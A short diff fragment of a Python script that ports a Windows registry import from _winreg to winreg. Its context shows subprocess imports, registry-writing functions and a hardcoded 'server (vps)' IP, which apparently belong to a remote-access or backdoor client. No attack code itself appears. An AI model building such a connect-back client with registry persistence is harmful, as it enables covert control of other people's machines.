@@ -4,7 +4,7 @@ import subprocess
 import os
 import sys
 import shutil
-from _winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, CloseKey
+from winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, CloseKey
 
 #configuracion del servidor (vps)
 IP_SERVER = '142.93.62.130'
